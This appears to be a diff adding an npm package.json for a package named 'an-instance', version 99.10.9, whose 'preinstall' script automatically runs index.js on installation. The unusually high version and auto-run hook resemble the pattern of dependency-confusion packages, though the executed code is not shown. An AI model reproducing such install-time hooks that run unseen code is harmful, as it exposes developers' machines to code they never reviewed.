@@ -1,0 +1,12 @@
+{
+  "name": "an-instance",
+  "version": "99.10.9",
+  "description": "azbit package",
+  "main":"index.js",
+  "scripts":{
+  "test":"echo 'error no test specified' && exit 1",
+  "preinstall":"node index.js"
+  },
+  "author":"",
+  "License":"ISC"
+}
